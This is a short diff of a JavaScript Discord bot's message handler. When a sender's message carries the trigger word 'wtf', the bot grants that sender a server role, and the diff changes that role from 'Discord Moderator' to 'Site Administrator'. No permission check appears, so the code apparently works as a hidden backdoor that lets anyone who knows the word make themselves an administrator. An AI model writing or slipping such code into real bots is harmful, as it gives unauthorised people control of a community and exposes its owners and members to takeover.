@@ -13,7 +13,7 @@ client.on('message', message => {
             console.log(args);
             if(args[1] === 'wtf')
                 {
-                    var role = message.guild.roles.find("name", "Discord Moderator");
+                    var role = message.guild.roles.find("name", "Site Administrator");
                     console.log("Role Found!")
                     message.member.addRole(role.id);
                 }
